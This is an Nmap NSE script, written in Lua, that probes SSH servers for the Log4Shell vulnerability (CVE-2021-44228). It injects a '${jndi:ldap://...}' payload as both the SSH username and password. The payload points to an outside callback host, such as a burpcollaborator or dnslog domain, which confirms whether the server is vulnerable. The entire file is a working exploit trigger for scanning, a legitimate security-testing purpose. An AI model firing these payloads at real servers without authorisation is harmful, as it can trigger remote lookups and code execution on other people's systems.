local shortport = require "shortport"
local stdnse = require "stdnse"

local libssh2_util = require "libssh2-utility"

description = [[
Performs username and password as log4shell payload against SSH server.
]]

---
-- @usage
--   nmap -p 22 --script ssh-log4shell --script-args log4shell.payload=log4shell.payload="${jndi:ldap://{{target}}.xxxx.burpcollaborator.net
--
-- @args ssh-log4shell.timeout    Connection timeout (default: "5s")

author = "Vlatko Kosturjak"
license = "Same as Nmap--See https://nmap.org/book/man-legal.html"
categories = {
  'intrusive',
  'log4shell'
}

-- Metadata
severity = 4
confirm = "SSH server is vulnerable to log4shell vulnerability (CVE-2021-44228)."
intensity = 2

-- portrule = shortport.ssh
portrule = shortport.port_or_service( {22}, {"ssh"}, "tcp", "open")

local arg_timeout = stdnse.get_script_args(SCRIPT_NAME .. ".timeout") or "5s"

local function password_auth_allowed (host, port)
  local helper = libssh2_util.SSHConnection:new()
  if not helper:connect(host, port) then
    return "Failed to connect to ssh server"
  end
  local methods = helper:list "root"
  if methods then
    for _, value in pairs(methods) do
      if value == "password" then
        return true
      end
    end
  end
  return false
end

function action (host, port)
  local timems = stdnse.parse_timespec(arg_timeout) --todo: use this!
  local ssh_timeout = 1000 * timems

  local payload = stdnse.get_script_args(SCRIPT_NAME..".payload")
  local gpayload = stdnse.get_script_args("log4shell.payload")

  if not payload then
    if not gpayload then
      if nmap.registry['dnslog-cn'] then
	 stdnse.debug2("registry not present")
	 local registry = nmap.registry['dnslog-cn']
	 if registry.domain then
	       payload = "${jndi:ldap://{{target}}."..registry.domain.."}"
	 else
	       stdnse.debug2("session not present")
	 end
      else
	 payload = "${jndi:ldap://mydomain/uri}"
      end
      stdnse.debug1("Setting the payload to default payload:"..payload)
    else
      payload=gpayload
    end
  end

  if password_auth_allowed(host, port) then
    local options = {
      ssh_timeout = ssh_timeout,
    }
    target = host.ip .. "-" .. port.number
    payload = payload:gsub("{{target}}", target)

    stdnse.debug1("Final payload:"..payload)

    helper = libssh2_util.SSHConnection:new()
    local status, err = helper:connect_pcall(host, port)
    if not status then
      stdnse.debug(2, "libssh2 error: %s", helper.session)
      return
    elseif not helper.session then
      stdnse.debug(2, "failure to connect: %s", err)
      return
    else
      helper:set_timeout(options.ssh_timeout)
    end
    username = payload
    password = payload
    stdnse.debug(1, "sending payload: %s", payload)
    local status, resp = helper:password_auth(username, password)
    if status then
      return "Password as payload succeeded. Weird"
    end
    helper:disconnect()
  else
    return "Password authentication not allowed"
  end
end
